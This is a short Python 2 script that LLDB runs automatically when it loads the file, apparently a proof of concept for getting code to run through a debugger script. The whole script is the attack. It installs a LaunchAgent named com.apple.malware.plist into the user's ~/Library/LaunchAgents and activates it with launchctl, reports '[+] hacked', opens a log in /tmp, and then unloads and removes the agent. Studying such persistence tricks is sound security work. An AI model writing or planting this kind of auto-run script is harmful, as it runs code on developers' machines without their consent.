import os
import sys
from os.path import expanduser

def __lldb_init_module(debugger, internal_dict):
    home_path = expanduser("~")
    print "[+] home: %s" % (home_path)

    launch_agent_dir_path = os.path.join(home_path, "Library/LaunchAgents")
    print "[+] agent dir: %s" % (launch_agent_dir_path)
    launch_agent_path = os.path.join(launch_agent_dir_path, "com.apple.malware.plist")

    script_dir = os.path.dirname(os.path.realpath(__file__))
    print "[+] script dir: %s" % (script_dir)

    launch_agent_cfg_path = os.path.join(script_dir, "../com.apple.malware.plist")
    launch_agent_cfg_path = os.path.realpath(launch_agent_cfg_path)
    print "[+] agent cfg: %s" % (launch_agent_cfg_path)

    cmd = "cp %s %s" % (launch_agent_cfg_path, launch_agent_path)
    print "[+] intall launch agent"
    os.system(cmd)

    print "[+] load launch agent"
    cmd = "launchctl load %s" % (launch_agent_path)
    os.system(cmd)

    print "[+] hacked\n"

    # locate log file
    cmd = "open -R %s" % ("/tmp/com.apple.malware.txt")
    os.system(cmd)

    print "[+] unload launch agent"
    cmd = "launchctl unload %s" % (launch_agent_path)
    os.system(cmd)

    cmd = "rm %s" % (launch_agent_path)
    print "[+] unintall launch agent"
    os.system(cmd)
